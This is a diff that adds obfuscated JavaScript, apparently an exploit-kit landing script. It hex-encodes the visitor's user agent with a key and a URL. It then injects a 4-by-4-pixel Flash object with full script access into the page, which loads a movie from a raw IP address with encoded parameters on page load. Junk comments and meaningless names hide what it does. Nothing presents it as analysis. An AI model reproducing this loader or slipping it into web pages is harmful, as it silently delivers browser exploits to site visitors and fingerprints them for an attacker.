@@ -1,0 +1,23 @@
+/*s37530d43476hssfj58808fs*/function hgfgerdfgdf(num, width){/*s10917d59608hfj63124fs*/var vcbcvbnfd = "0123456789abcdef";var hgfgghf = "";/*s23388d1747hfj67271fs*/var hgfgerdfgdf = vcbcvbnfd.substr(num & 0xF, 1);while (num > 0xF) {num = num >>> 4;hgfgerdfgdf = vcbcvbnfd.substr(num & 0xF, 1) + hgfgerdfgdf;}var width = (width ? width : 0); while (hgfgerdfgdf.length < width)hgfgerdfgdf = "0" + hgfgerdfgdf;return hgfgerdfgdf;}/*s78119d82247hfj68942fs*/function ghnvbn(u, k) {var fr=String.fromCharCode;var c="", b="", d="", f=fr(0x20), g=fr(0), v=fr(0x22);/*s43469d88701hfj76097fs*/var app=k+v+f+v+u+v+f+v+navigator.userAgent+v+g+g+g+g;app.length%2 && (app+=g);for (var e = 0; e < app.length; e++) {b = hgfgerdfgdf(app.charCodeAt(e),2);d = hgfgerdfgdf(app.charCodeAt(e+1),2);/*sdhd69839hfs*/c += b + d;/*s67251d7542hfj47529fs*/e += 1;}return c;}/*s56676dfsffd*/
+
+	function hfdf(fus,asd)
+	{
+	var cvbfh = '<object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" allowScriptAccess=always width="4" height="4">';
+	cvbfh = cvbfh + '<param name="movie" value="' + fus + '" />';
+	cvbfh = cvbfh + '<param name="play" value="true"/>';
+	cvbfh = cvbfh + '<param name=FlashVars value="menu=' + asd + '" />';
+	cvbfh = cvbfh + '<!--[if !IE]>-->';
+	cvbfh = cvbfh + '<object type="application/x-shockwave-flash" data="' + fus + '" allowScriptAccess=always width="4" height="4">';
+	cvbfh = cvbfh + '<param name="movie" value="' + fus + '" />';
+	cvbfh = cvbfh + '<param name="play" value="true"/>';
+	cvbfh = cvbfh + '<param name=FlashVars value="menu=' + asd +   '" />';
+	cvbfh = cvbfh + '<!--<![endif]-->';
+	cvbfh = cvbfh + '<!--[if !IE]>--></object><!--<![endif]-->';
+	cvbfh = cvbfh + '</object>';
+
+	var ffert = document.createElement("div");
+	ffert.innerHTML = cvbfh;
+	document.body.appendChild(ffert);
+	} 
+	
+	hfdf("http://185.158.155.137/?NzQyMzMyMzE=&pa=xH_QMrDYbR7FFYPfKPrEUKREMU3WA0SKwY-Zha_VF5yxFDTGpbH1Fx_spV-dCF-EmvFvdLAHIwKh1UTASwR&ma=izY8MAVhHpav7jUPVyBTK0ZWB-hfYYwgQrpOQEbNp0V_2zLMXJMonxhTQvGBVy-gtU1gS4QgWla_7VaOO-w&shop=MjgwNjAyNQ==", ghnvbn("http://185.158.155.137/?NjI4OTEyNDQ=&pa=xHzQMrPYbR3FFYDfKPnEUKREMU3WA0eKwY-Zha_VF5-xFDfGpbL1FxzspV-dCFyEmvJvdLAHIwKh1UfASwR&ma=izYwMAVtHpav7jUDVyBTK0ZWB-hfYYwsQrpCQEbBp0V_2zLMXJMonxhTQvGNVy-stWlsY5ggTlaz7S6OJrg&work=NDA3NzA5Mg==","wexykukusw"));
